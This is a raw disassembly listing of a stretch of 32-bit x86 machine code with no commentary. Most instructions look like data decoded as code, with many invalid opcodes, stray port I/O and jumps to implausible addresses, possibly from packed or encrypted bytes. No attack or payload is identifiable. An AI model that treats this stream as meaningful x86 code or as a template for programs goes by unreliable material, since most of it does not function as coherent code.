  40385d:	into   
  40385e:	jno    0x40384a
  403860:	es retf 0xe683
  403864:	push   esi
  403865:	addr16 push cs
  403867:	mov    ch,0x16
  403869:	mov    ebx,0xb47cb5b1
  40386e:	cmp    al,BYTE PTR [ecx+0x46]
  403871:	pop    ebx
  403872:	xor    eax,0xbe658a82
  403877:	add    eax,0x3d18c1d3
  40387c:	or     esp,DWORD PTR [eax+0x7e]
  40387f:	popa   
  403880:	add    ch,BYTE PTR [ecx-0x126ca8a5]
  403886:	lahf   
  403887:	pop    edx
  403888:	out    dx,al
  403889:	push   cs
  40388a:	out    0x62,al
  40388c:	sar    BYTE PTR [ecx+0x47f21c88],cl
  403892:	dec    ebp
  403893:	add    DWORD PTR [edi],0x7a
  403896:	push   ebp
  403897:	sbb    BYTE PTR [ecx-0x6f5e9347],ch
  40389d:	dec    eax
  40389e:	shl    BYTE PTR [eax+0x3203c511],0x7a
  4038a5:	int    0x2c
  4038a7:	mov    ah,0x5d
  4038a9:	inc    ah
  4038ab:	loopne 0x40391f
  4038ad:	or     al,0xe7
  4038af:	repnz adc esi,DWORD PTR [edi]
  4038b2:	pop    edi
  4038b3:	stos   DWORD PTR es:[edi],eax
  4038b4:	sbb    esi,DWORD PTR [ebx]
  4038b6:	ins    DWORD PTR es:[edi],dx
  4038b7:	(bad)  
  4038b9:	cwde   
  4038ba:	cs push ss
  4038bc:	in     al,dx
  4038bd:	xor    esi,DWORD PTR [ecx]
  4038bf:	sbb    al,0x8a
  4038c1:	add    al,0x8
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x21d405f3
  4038d5:	cmp    ebx,0x28
  4038d8:	adc    al,0x1d
  4038da:	js     0x403954
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x403958
  4038e1:	popf   
  4038e2:	aad    0xd5
  4038e4:	retf   0xbb02
  4038e7:	cmp    al,0x6e
  4038e9:	lock ror DWORD PTR [ebx],1
  4038ec:	add    ecx,DWORD PTR [esi+0x42f17d2]
  4038f2:	scas   al,BYTE PTR es:[edi]
  4038f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038f4:	sub    al,0x8c
  4038f6:	inc    edx
  4038f7:	(bad)  
  4038f8:	or     eax,0x573af271
  4038fd:	pop    ebp
  4038fe:	popa   
  4038ff:	or     ah,BYTE PTR [edx]
  403901:	pusha  
  403902:	in     eax,dx
  403903:	mov    bl,0x34
  403905:	pusha  
  403906:	aam    0x5d
  403908:	in     al,dx
  403909:	push   ebp
  40390a:	xchg   edx,eax
  40390b:	dec    ebp
  40390c:	test   al,0x8a
  40390e:	jmp    0x28c2c535
  403913:	inc    edx
  403914:	and    ah,BYTE PTR [ebx]
  403916:	test   BYTE PTR [ebp+0x46],cl
  403919:	shl    DWORD PTR [esi],1
  40391b:	mov    al,0x23
  40391d:	mov    ecx,0x7c50464f
  403922:	scas   al,BYTE PTR es:[edi]
  403923:	xchg   ebp,eax
  403924:	jno    0x40395a
  403926:	daa    
  403927:	(bad)  [eax]
  403929:	push   esp
  40392a:	lods   al,BYTE PTR ds:[esi]
  40392b:	ins    BYTE PTR es:[edi],dx
  40392c:	stos   BYTE PTR es:[edi],al
  40392d:	jne    0x4038c8
  40392f:	mov    ds:0x4b60ae74,al
  403934:	cld    
  403935:	mov    esi,0x9748e3b0
  40393a:	mov    ebx,DWORD PTR [edx]
  40393c:	push   es
  40393d:	(bad)  [eax+0x15]
  403940:	mov    DWORD PTR [ebx],esi
  403942:	lods   al,BYTE PTR ds:[esi]
  403943:	int3   
  403944:	or     eax,ecx
  403946:	loope  0x403903
  403948:	inc    ecx
  403949:	mov    al,ds:0x6bd35c82
  40394e:	mov    ds:0xc5e917a7,al
  403953:	inc    ecx
  403954:	cmc    
  403955:	xor    ebx,eax
  403957:	mov    ds:0xc64a868e,al
  40395c:	cmp    dh,BYTE PTR [ebp-0x754a52b8]
  403962:	or     eax,0xf57d80c0
  403967:	inc    ebx
  403968:	ret    0x5b80
  40396b:	mov    ss,WORD PTR [esi-0x7adcbf15]
  403971:	scas   al,BYTE PTR es:[edi]
  403972:	add    edx,DWORD PTR [esi+ebx*8-0x445918bf]
  403979:	fwait
  40397a:	sbb    eax,0xf490629f
  40397f:	pop    ebx
  403980:	fistp  DWORD PTR [edx+edi*2]
  403983:	lods   al,BYTE PTR ds:[esi]
  403984:	rol    ch,0xe
  403987:	xor    DWORD PTR [ebx],0xffffff87
  40398a:	cmp    al,0xc0
  40398c:	popf   
  40398d:	xchg   esi,eax
  40398e:	addr16 jbe 0x403a08
  403991:	mov    edi,0x63e7c3e0
  403996:	push   es
  403997:	shr    BYTE PTR [edx+0x5e],1
  40399a:	sbb    al,dl
  40399c:	gs sub eax,0xe75e4bf4
  4039a2:	mov    dl,0xe
  4039a4:	pop    esp
  4039a5:	cs jae 0x4039ec
  4039a8:	rcr    DWORD PTR [edi+esi*1-0x77909f75],1
  4039af:	fwait
  4039b0:	adc    eax,0x8ce0feb9
  4039b5:	mov    eax,ds:0x653fa3a2
  4039ba:	pop    edx
  4039bb:	mov    ch,0xd8
  4039bd:	push   esp
  4039be:	lds    ecx,FWORD PTR [eax]
  4039c0:	out    0xaa,al
  4039c2:	stos   BYTE PTR es:[edi],al
  4039c3:	daa    
  4039c4:	inc    eax
  4039c5:	xchg   ebp,eax
  4039c6:	add    eax,0xe0a31152
  4039cb:	outs   dx,DWORD PTR ds:[esi]
  4039cc:	sub    bh,ch
  4039ce:	jns    0x403950
  4039d0:	mov    ?,ebx
  4039d2:	xchg   DWORD PTR [esi-0x23],edi
  4039d5:	inc    esi
  4039d6:	push   edx
  4039d7:	daa    
  4039d8:	sbb    eax,0xc069cb51
  4039dd:	add    al,0x48
  4039df:	pop    ecx
  4039e0:	retf   0xef4
  4039e3:	push   eax
  4039e4:	pop    es
  4039e5:	ret    
  4039e6:	push   edx
  4039e7:	repz lahf 
  4039e9:	pop    esp
  4039ea:	pop    ds
  4039eb:	push   es
  4039ec:	or     dl,BYTE PTR [edx-0x55837e57]
  4039f2:	inc    edx
  4039f3:	or     cl,BYTE PTR [edx]
  4039f5:	inc    esp
  4039f6:	dec    edi
  4039f7:	xchg   ebp,eax
  4039f8:	inc    ebp
  4039f9:	fldcw  WORD PTR [esi]
  4039fb:	adc    edx,DWORD PTR [eax-0x74]
  4039fe:	inc    esp
  4039ff:	mov    ds:0xc745a34f,eax
  403a04:	sbb    edx,eax
  403a06:	add    eax,0x2af34572
  403a0b:	mov    esi,0x71a50e2
  403a10:	jns    0x403a0d
  403a12:	push   esp
  403a13:	cmp    ah,al
  403a15:	push   0x4a263d8a
  403a1a:	cmp    edi,ecx
  403a1c:	sbb    eax,0x663215c1
  403a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a22:	xchg   edx,eax
  403a23:	inc    eax
  403a24:	pop    ebx
  403a25:	or     bh,cl
  403a27:	not    BYTE PTR [ebp+0x6f]
  403a2a:	(bad)  
  403a2b:	pop    ecx
  403a2c:	stos   BYTE PTR es:[edi],al
  403a2d:	jbe    0x403a9e
  403a2f:	or     ebp,eax
  403a31:	fdiv   DWORD PTR [edx-0x66]
  403a34:	inc    edi
  403a35:	data16 sbb al,BYTE PTR [ecx-0x7e]
  403a39:	sub    eax,ebp
  403a3b:	fs stos DWORD PTR es:[edi],eax
  403a3d:	pop    edi
  403a3e:	stos   DWORD PTR es:[edi],eax
  403a3f:	aaa    
  403a40:	retf   0xb9d0
  403a43:	pop    eax
  403a44:	out    dx,eax
  403a45:	dec    esp
  403a46:	jnp    0x403ab2
  403a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a49:	or     al,0x4b
  403a4b:	inc    ebp
  403a4c:	dec    edx
  403a4d:	ret    0x545
  403a50:	in     al,0xe8
  403a52:	push   es
  403a53:	sbb    DWORD PTR [ecx+0x8],eax
  403a56:	call   0xa4d5:0x48effd97
  403a5d:	int3   
  403a5e:	mov    al,0xc
  403a60:	add    al,0x8e
  403a62:	dec    ebp
  403a63:	and    eax,0xf16e097
  403a68:	popf   
  403a69:	and    al,dh
  403a6b:	dec    DWORD PTR [edi+0x51ecb3ff]
  403a71:	push   es
  403a72:	in     eax,dx
  403a73:	mov    ds:0x40ca0c8a,al
  403a78:	mov    edx,0x99169beb
  403a7d:	shl    BYTE PTR [ebx-0x4aa030ab],1
  403a83:	sbb    BYTE PTR [edi+0x21],al
  403a86:	xchg   ecx,eax
  403a87:	loope  0x403af5
  403a89:	retf   0x4c2a
  403a8c:	mov    ah,0x6
  403a8e:	xor    bl,bl
  403a90:	mov    ah,0x4f
  403a92:	lea    edi,[eax]
  403a94:	push   edx
  403a95:	mov    dh,0xec
  403a97:	push   cs
  403a98:	jg     0x403a4e
  403a9a:	jg     0x403a28
  403a9c:	dec    esp
  403a9d:	jnp    0x403a8d
  403a9f:	mov    esp,0x3eb19cdf
  403aa4:	ret    
  403aa5:	jb     0x403aa9
  403aa7:	neg    BYTE PTR [ecx-0x5edf5d34]
  403aad:	inc    ebx
  403aae:	div    DWORD PTR [edi+0x6ffdd122]
  403ab4:	popf   
  403ab5:	jge    0x403a46
  403ab7:	shr    edi,0xc8
  403aba:	push   edx
  403abb:	mov    ebx,0xb3cf3951
  403ac0:	xchg   ebx,eax
  403ac1:	mov    ds,WORD PTR [ebp-0xe97a3d9]
  403ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ac8:	cmp    bl,ah
  403aca:	mov    eax,ds:0x58d385a5
  403acf:	jp     0x403a6a
  403ad1:	aas    
  403ad2:	scas   al,BYTE PTR es:[edi]
  403ad3:	jmp    0x35ccb19d
  403ad8:	add    eax,DWORD PTR [ebx]
  403ada:	leave  
  403adb:	sbb    eax,0x16f0aaaa
  403ae0:	jae    0x403a67
  403ae2:	cmp    DWORD PTR [edx],edi
  403ae4:	ins    BYTE PTR es:[edi],dx
  403ae5:	mov    ah,0x7
  403ae7:	test   DWORD PTR [ecx],eax
  403ae9:	pop    esi
  403aea:	jmp    0x6bbd9871
  403aef:	lea    esp,[edx+edi*4-0x2424dae1]
  403af6:	mov    al,0xce
  403af8:	retf   
  403af9:	loopne 0x403b1d
  403afb:	sub    bl,bl
  403afd:	push   edi
  403afe:	(bad)  
  403aff:	icebp  
  403b00:	jge    0x403b63
  403b02:	daa    
  403b03:	jg     0x403b82
  403b05:	sub    bl,BYTE PTR [ebx+0x509db667]
  403b0b:	xor    BYTE PTR ss:[edx+0x53c98425],0xe9
  403b13:	scas   eax,DWORD PTR es:[edi]
  403b14:	or     eax,0xa7f4760e
  403b19:	add    al,0x16
  403b1b:	daa    
  403b1c:	shr    DWORD PTR [ebx+0x4cc6b13a],cl
  403b22:	sbb    al,0x3
  403b24:	cli    
  403b25:	imul   esp,DWORD PTR [ecx],0x184a0ed
  403b2b:	sub    ah,BYTE PTR [eax]
  403b2d:	xlat   BYTE PTR ds:[ebx]
  403b2e:	mov    BYTE PTR [eax-0x1769cf04],bh
  403b34:	sbb    al,BYTE PTR ds:0xb25d2e94
  403b3a:	mov    cl,bl
  403b3c:	daa    
  403b3d:	out    0x2a,al
  403b3f:	mov    ds:0x6e94e3e5,eax
  403b44:	mov    esi,0xe4fa5157
  403b49:	int    0xd9
  403b4b:	pop    edi
  403b4c:	push   ecx
  403b4d:	loope  0x403b0e
  403b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b50:	enter  0x2538,0x4
  403b54:	dec    ebx
  403b55:	adc    al,0x33
  403b57:	(bad)  
  403b58:	adc    al,0x72
  403b5a:	(bad)  
  403b5b:	cld    
  403b5c:	pop    ebp
  403b5d:	(bad)  
  403b5e:	jg     0x403bd0
  403b60:	jb     0x403b40
  403b62:	add    al,0x3b
  403b64:	xor    al,0x43
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	(bad)  
  403b80:	rcl    DWORD PTR [ebx+0x78239a37],1
  403b86:	js     0x403b86
  403b88:	jle    0x403c02
  403b8a:	js     0x403b0c
  403b8c:	sahf   
  403b8d:	mov    ds:0xbbdb4689,eax
  403b92:	xchg   edx,eax
  403b93:	cmp    BYTE PTR [eax+esi*8],0xf3
  403b97:	and    ch,BYTE PTR [edx+0x351d325f]
  403b9d:	sar    BYTE PTR [eax],cl
  403b9f:	dec    ebp
  403ba0:	into   
  403ba1:	mov    cl,0xa
  403ba3:	jmp    0xc5181112
  403ba8:	aas    
  403ba9:	imul   edx,DWORD PTR [ebx+0x57d916b3],0x8
  403bb0:	mov    ebx,0x25f43094
  403bb5:	dec    ebx
  403bb6:	jmp    0xc22f:0x70a89e61
  403bbd:	nop
  403bbe:	cmp    esi,DWORD PTR [esi-0xfa9b9]
  403bc4:	xlat   BYTE PTR ds:[ebx]
  403bc5:	inc    ebx
  403bc6:	ins    DWORD PTR es:[edi],dx
  403bc7:	inc    ebx
  403bc8:	or     DWORD PTR [edx+ecx*4+0x68],ebp
  403bcc:	rcr    BYTE PTR [ebp+0x7d1f1e20],1
  403bd2:	cmp    esp,edx
  403bd4:	loope  0x403c04
  403bd6:	sub    esp,DWORD PTR [edx]
  403bd8:	xor    al,0xfa
  403bda:	sbb    DWORD PTR [ecx-0x46],0x5d040e01
  403be1:	mov    dh,0x66
  403be3:	dec    edi
  403be4:	addr16 cli 
  403be6:	dec    edx
  403be7:	(bad)  
  403be8:	mov    ah,0x71
  403bea:	sub    eax,0xf640b277
  403bef:	xor    BYTE PTR [eax-0x6c],al
  403bf2:	mov    esi,0xb5535e0d
  403bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bf8:	mov    bh,0x96
  403bfa:	call   0x4cdb:0x6b8f3dc2
  403c01:	call   0xbc8b:0x833de8b0
  403c08:	add    ecx,DWORD PTR [ebx+0x10]
  403c0b:	jmp    0x3b690b6f
  403c10:	xchg   esp,eax
  403c11:	and    DWORD PTR [ebp-0x3a],edi
  403c14:	ffreep st(2)
  403c16:	pop    esi
  403c17:	mul    bh
  403c19:	test   BYTE PTR [ebx],bl
  403c1b:	aad    0xb7
  403c1d:	or     edx,DWORD PTR [esi+ebx*8-0x19]
  403c21:	mov    ds:0xb121080c,eax
  403c26:	xchg   BYTE PTR [edx],ch
  403c28:	add    BYTE PTR [ebp+0x8],0x1d
  403c2c:	jae    0x403c32
  403c2e:	pop    eax
  403c2f:	addr16 or eax,0xf869f199
  403c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c36:	scas   al,BYTE PTR es:[edi]
  403c37:	jo     0x403ca6
  403c39:	or     DWORD PTR [ebp+0xc],ebx
  403c3c:	js     0x403c13
  403c3e:	sti    
  403c3f:	ins    BYTE PTR es:[edi],dx
  403c40:	data16 mov ds:0xf1f207ca,al
  403c46:	punpckhwd mm1,mm5
  403c49:	aas    
  403c4a:	dec    edi
  403c4b:	fnstcw WORD PTR ds:0x2f48299
  403c51:	cmp    DWORD PTR [eax],ebp
  403c53:	stos   DWORD PTR es:[edi],eax
  403c54:	and    al,0x4e
  403c56:	jne    0x403cc0
  403c58:	stc    
  403c59:	or     al,0x9d
  403c5b:	outs   dx,DWORD PTR ds:[esi]
  403c5c:	aaa    
  403c5d:	mov    ds:0x3263f11e,eax
  403c62:	sahf   
  403c63:	mov    edi,0x76cd94f3
  403c68:	dec    esi
  403c69:	imul   ecx,DWORD PTR [ecx-0x6ab09e1b],0x5c
  403c70:	rep outs dx,BYTE PTR ds:[esi]
  403c72:	pop    ebp
  403c73:	push   0x6389922a
  403c78:	popaw  
  403c7a:	arpl   WORD PTR [ecx+ebp*2+0x409f9a2c],bp
  403c81:	mov    dl,0x2c
  403c83:	outs   dx,DWORD PTR ds:[esi]
  403c84:	lea    edx,[edi-0x66044df]
  403c8a:	shr    ch,cl
  403c8c:	fdivr  DWORD PTR [eax]
  403c8e:	jae    0x403c11
  403c90:	and    DWORD PTR ds:0xffe8cf2c,eax
  403c96:	lds    ebp,FWORD PTR [ecx-0x424f96b6]
  403c9c:	int    0x17
  403c9e:	sbb    al,bh
  403ca0:	mov    dh,0x4b
  403ca2:	inc    ecx
  403ca3:	imul   eax,DWORD PTR [ecx+0x39],0xc3770942
  403caa:	jp     0x403cee
  403cac:	and    ebp,DWORD PTR [eax+0x57dcca5]
  403cb2:	xchg   edi,eax
  403cb3:	xchg   DWORD PTR [esi+0xad4d8d4],ecx
  403cb9:	ins    DWORD PTR es:[edi],dx
  403cba:	fwait
  403cbb:	in     eax,dx
  403cbc:	mul    dh
  403cbe:	inc    ebp
  403cbf:	bound  eax,QWORD PTR [esi-0x6f]
  403cc2:	mov    eax,0x9513947c
  403cc7:	ins    BYTE PTR es:[edi],dx
  403cc8:	adc    BYTE PTR [eax-0x2dcf6bde],ch
  403cce:	pop    esi
  403ccf:	and    eax,0x1eafd030
  403cd4:	adc    BYTE PTR [edx],ch
  403cd6:	xchg   DWORD PTR [esi-0x55],esi
  403cd9:	add    ebp,DWORD PTR [esi]
  403cdb:	inc    edx
  403cdc:	lock or dl,BYTE PTR [ebx]
  403cdf:	sbb    esp,DWORD PTR [edx+0x9a14f1a]
  403ce5:	adc    eax,0x7ca6fc2d
  403cea:	cmp    DWORD PTR [ebx-0xe],0xffffffe3
  403cee:	mov    ds:0xa8b752f1,eax
  403cf3:	stos   DWORD PTR es:[edi],eax
  403cf4:	loopne 0x403d6e
  403cf6:	bnd jae 0x403cbc
  403cf9:	jl     0x403cfb
  403cfb:	mov    DWORD PTR [ebx+0x7e],edx
  403cfe:	xchg   esi,eax
  403cff:	sbb    al,0xcd
  403d01:	and    BYTE PTR [ebx+0x3d],dl
  403d04:	les    eax,FWORD PTR ds:0x8b4fe157
  403d0a:	add    DWORD PTR [edi+0x757bd5a7],ecx
  403d10:	addr16 mov ebp,0xe28b3eef
  403d16:	jmp    0x403d44
  403d18:	sbb    al,0xce
  403d1a:	mov    ?,WORD PTR [esi]
  403d1c:	push   eax
  403d1d:	mov    ds:0x36a4e42a,eax
  403d22:	mov    ebx,0xde9ceaea
  403d27:	and    eax,0x77877357
  403d2c:	jecxz  0x403dac
  403d2e:	shl    DWORD PTR [edi+edi*2],cl
  403d31:	jnp    0x403d38
  403d33:	stc    
  403d34:	jmp    0x403cea
  403d36:	inc    esp
  403d37:	pop    ss
  403d38:	dec    ebx
  403d39:	or     ebx,DWORD PTR ds:0x5d351ee3
  403d3f:	mov    esp,0xfbb301da
  403d44:	std    
  403d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d46:	xchg   ecx,eax
  403d47:	add    BYTE PTR [edx],cl
  403d49:	in     al,0xe
  403d4b:	test   al,0xed
  403d4d:	mov    ds:0x117c12ee,eax
  403d52:	xor    al,0x51
  403d54:	sub    eax,0xd9ecd467
  403d59:	jle    0x403d7f
  403d5b:	inc    eax
  403d5c:	xchg   BYTE PTR [edx],cl
  403d5e:	sub    eax,0xabd9aab4
  403d63:	loopne 0x403da7
  403d65:	sbb    dl,dh
  403d67:	push   0x4532fc9d
  403d6c:	xchg   edx,eax
  403d6d:	int3   
  403d6e:	cmp    BYTE PTR [esi+0x56],bl
  403d71:	(bad)  
  403d72:	adc    ch,BYTE PTR [ecx]
  403d74:	lds    ecx,FWORD PTR [ebx-0x55]
  403d77:	rcl    BYTE PTR [esp+ecx*1],1
  403d7a:	test   eax,0x7bf1bc75
  403d7f:	xor    eax,0x3f05c4fa
  403d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d85:	ror    BYTE PTR [ebp+0x7609c052],cl
  403d8b:	jle    0x403e0a
  403d8d:	fs jno 0x403d35
  403d90:	jg     0x403d24
  403d92:	test   al,0xb7
  403d94:	push   ebp
  403d95:	inc    ebp
  403d96:	test   BYTE PTR [ecx],bl
  403d98:	leave  
  403d99:	mov    ss,WORD PTR [esp+eax*1]
  403d9c:	xchg   BYTE PTR [ebx+0x6c8a077d],ch
  403da2:	jecxz  0x403d8d
  403da4:	fs mov dh,0xb5
  403da7:	call   DWORD PTR [eax-0x56]
  403daa:	xchg   ah,bl
  403dac:	dec    eax
  403dad:	imul   edi,DWORD PTR [esi+0x51],0xb46d4141
  403db4:	xchg   ebp,eax
  403db5:	test   eax,0x305fdcaf
  403dba:	pop    eax
  403dbb:	(bad)  
  403dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dbd:	fld    QWORD PTR [ecx-0x612a63f]
  403dc3:	mov    esp,0x6c4db63e
  403dc8:	push   esi
  403dc9:	sar    dl,1
  403dcb:	mov    esi,0x183d9fe
  403dd0:	and    eax,0x524fc8f8
  403dd5:	fcomp  st(0)
  403dd7:	ret    0x785f
  403dda:	std    
  403ddb:	inc    edi
  403ddc:	out    dx,al
  403ddd:	mov    dl,0x90
  403ddf:	mov    ah,0x7b
  403de1:	xor    eax,0xf0be72f7
  403de6:	xchg   ecx,eax
  403de7:	jmp    0x78c8:0x22683d92
  403dee:	sub    ebp,DWORD PTR [edi]
  403df0:	es gs jmp 0x4200:0xd4359760
  403df9:	lds    esp,FWORD PTR [edx]
  403dfb:	fistp  WORD PTR [ebp+0x147cdea]
  403e01:	aaa    
  403e02:	int3   
  403e03:	icebp  
  403e04:	(bad)  
  403e05:	lahf   
  403e06:	xchg   edi,eax
  403e07:	add    cl,BYTE PTR [esi+eiz*8]
  403e0a:	pop    ebp
  403e0b:	mov    ch,0xdb
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xd4dd8593
  403e30:	xchg   ebp,eax
  403e31:	xchg   ebp,eax
  403e32:	mov    ch,0x18
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e9f
  403e3c:	in     eax,dx
  403e3d:	test   ecx,esi
  403e3f:	out    0x5f,eax
  403e41:	dec    edx
  403e42:	repz push esi
  403e44:	pop    ebx
  403e45:	fld    DWORD PTR [edx+0x28cd7d0a]
  403e4b:	mov    ah,0xe6
  403e4d:	into   
  403e4e:	sub    bl,BYTE PTR [eax-0x29f9e952]
  403e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e55:	dec    ebp
  403e56:	xor    bl,BYTE PTR [ebx]
  403e58:	xor    DWORD PTR [ecx-0x7e],edi
  403e5b:	fimul  DWORD PTR [edi-0x1e1c3a09]
  403e61:	cmp    ebp,DWORD PTR [ecx+0x1929468d]
  403e67:	in     al,0xba
  403e69:	sbb    eax,0x4ada17d2
  403e6e:	mov    ecx,0x30ceaf7
  403e73:	add    dl,BYTE PTR [ecx-0x16544333]
  403e79:	aad    0x77
  403e7b:	jmp    0xdf9c72b0
  403e80:	push   esp
  403e81:	es sbb eax,0xe1d0b574
  403e87:	cld    
  403e88:	icebp  
  403e89:	retf   
  403e8a:	mov    ch,0x90
  403e8c:	pop    ebp
  403e8d:	imul   ebx,DWORD PTR [edx+edi*2+0x3e],0xffffffed
  403e92:	adc    al,0x47
  403e94:	inc    esi
  403e95:	push   es
  403e96:	test   al,0x2a
  403e98:	idiv   ebx
  403e9a:	ds sti 
  403e9c:	adc    dh,BYTE PTR [esi-0x6a]
  403e9f:	lods   al,BYTE PTR ds:[esi]
  403ea0:	jae    0x403ec3
  403ea2:	mov    ebx,0x9c3a34c5
  403ea7:	shl    cl,1
  403ea9:	xchg   edi,eax
  403eaa:	inc    edi
  403eab:	retf   
  403eac:	out    0xd4,al
  403eae:	dec    ecx
  403eaf:	adc    BYTE PTR [edx-0xa5b5ba0],dl
  403eb5:	jle    0x403f34
  403eb7:	push   ds
  403eb8:	daa    
  403eb9:	jge    0x403ee0
  403ebb:	iret   
  403ebc:	imul   ebp,DWORD PTR [eax-0x2d],0xffffffc2
  403ec0:	clc    
  403ec1:	xchg   esp,eax
  403ec2:	out    dx,eax
  403ec3:	loop   0x403f12
  403ec5:	jecxz  0x403e50
  403ec7:	jbe    0x403e7d
  403ec9:	jb     0x403edc
  403ecb:	and    al,0x26
  403ecd:	iret   
  403ece:	mov    ebx,0xf0b37dfc
  403ed3:	dec    eax
  403ed4:	stos   BYTE PTR es:[edi],al
  403ed5:	jg     0x403ef1
  403ed7:	push   ds
  403ed8:	out    dx,al
  403ed9:	jmp    0x8c77d2ea
  403ede:	(bad)  
  403edf:	adc    dh,BYTE PTR [edx]
  403ee1:	test   BYTE PTR [eax+eax*1-0x19ae1650],dh
  403ee8:	or     DWORD PTR [edi-0x21],eax
  403eeb:	out    0x26,eax
  403eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403eee:	push   ds
  403eef:	xchg   esi,eax
  403ef0:	xchg   edx,eax
  403ef1:	push   eax
  403ef2:	mov    eax,ds:0x337edf59
  403ef7:	stc    
  403ef8:	dec    esi
  403ef9:	cs test al,0x9
  403efc:	sub    DWORD PTR [esi-0x60ac2af4],0x21
  403f03:	and    al,0xca
  403f05:	aas    
  403f06:	inc    edx
  403f07:	push   cs
  403f08:	mov    bh,0x35
  403f0a:	push   cs
  403f0b:	mov    ah,0x8
  403f0d:	mov    DWORD PTR [edx+0x5bc4f336],esp
  403f13:	or     BYTE PTR [eax],bh
  403f15:	stc    
  403f16:	push   0xffffffbf
  403f18:	repz dec esi
  403f1a:	mov    al,ds:0x1ac3fb7f
  403f1f:	aad    0xf3
  403f21:	ret    
  403f22:	mov    WORD PTR [ecx+0x2bc81195],?
  403f28:	mov    esp,0x716010a7
  403f2d:	jbe    0x403f30
  403f2f:	push   es
  403f30:	xor    ax,0xf24a
  403f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f35:	pop    ss
  403f36:	pop    es
  403f37:	js     0x403f24
  403f39:	loopne 0x403ec9
  403f3b:	dec    esi
  403f3c:	sbb    eax,0x39e28778
  403f41:	das    
  403f42:	aaa    
  403f43:	lea    esi,[ebp-0x37]
  403f46:	cmp    al,0xba
  403f48:	jmp    0x38cd15f3
  403f4d:	popa   
  403f4e:	(bad)  
  403f4f:	cmp    al,0x7a
  403f51:	aad    0xc7
  403f53:	arpl   WORD PTR [ebx+0x3b0a9b69],si
  403f59:	pop    ecx
  403f5a:	add    al,cl
  403f5c:	dec    esi
  403f5d:	pop    esp
  403f5e:	inc    ebx
  403f5f:	test   ecx,eax
  403f61:	or     al,0x61
  403f63:	nop
  403f64:	jbe    0x403fe1
  403f66:	enter  0x8c0e,0xcc
  403f6a:	fmul   st,st(6)
  403f6c:	dec    esi
  403f6d:	jo     0x403fe6
  403f6f:	aas    
  403f70:	fmul   QWORD PTR [ebp+0x2d]
  403f73:	inc    eax
  403f74:	xor    BYTE PTR [edi],bh
  403f76:	add    BYTE PTR [esi+0x7361345f],bl
  403f7c:	push   ss
  403f7d:	shl    DWORD PTR [eax],cl
  403f7f:	mov    ch,0xcc
  403f81:	xor    BYTE PTR [eax+0x2f],dl
  403f84:	pop    ebx
  403f85:	scas   al,BYTE PTR es:[edi]
  403f86:	jecxz  0x403fb1
  403f88:	aad    0x4d
  403f8a:	adc    esp,DWORD PTR [esi]
  403f8c:	arpl   bp,bp
  403f8e:	sahf   
  403f8f:	mov    WORD PTR [esi-0x6f],gs
  403f92:	mov    esi,0x15042f0f
  403f97:	out    dx,al
  403f98:	fistp  QWORD PTR [esi]
  403f9a:	adc    al,0xc3
  403f9c:	mov    eax,0xb13c6860
  403fa1:	sub    DWORD PTR ds:0x118984c9,esi
  403fa7:	adc    ch,BYTE PTR [edx-0x6f212765]
  403fad:	mov    sp,ax
  403fb0:	(bad)  
  403fb2:	sahf   
  403fb3:	js     0x403fb7
  403fb5:	dec    esp
  403fb6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  403fb8:	(bad)  
  403fb9:	rcl    BYTE PTR [ebp+0x26],cl
  403fbc:	push   esp
  403fbd:	sbb    esp,ebx
  403fbf:	jl     0x40400b
  403fc1:	je     0x403fa2
  403fc3:	mov    ah,0x77
  403fc5:	jmp    0x9e67:0xb135179b
  403fcc:	inc    ecx
  403fcd:	and    BYTE PTR [edx],ah
  403fcf:	xor    BYTE PTR [eax+0x47a70228],0x58
  403fd6:	mov    bh,0x24
  403fd8:	jbe    0x403fa5
  403fda:	and    eax,0x90991b1
  403fdf:	cmp    al,0xd4
  403fe1:	ds push esi
  403fe3:	push   edx
  403fe4:	mov    ecx,0x44ed42d8
  403fe9:	or     BYTE PTR [ebp+0x4b],bl
  403fec:	in     eax,0x36
  403fee:	daa    
  403fef:	xchg   ebp,eax
  403ff0:	out    0xc4,eax
  403ff2:	test   BYTE PTR [ebx],cl
  403ff4:	mov    edx,0x6000a1e6
  403ff9:	in     eax,dx
  403ffa:	shr    BYTE PTR [ebp-0x56],0x25
  403ffe:	jl     0x40406a
  404000:	imul   ebx,DWORD PTR [ebx-0x5f987a8b],0x680d059e
  40400a:	ror    ah,1
  40400c:	icebp  
  40400d:	cmc    
  40400e:	lahf   
  40400f:	mov    ds:0x39a6fc32,eax
  404014:	jns    0x404057
  404016:	repz push edx
  404018:	data16 cmp BYTE PTR [edx-0x6f],ch
  40401c:	cmp    eax,0x9e8495c8
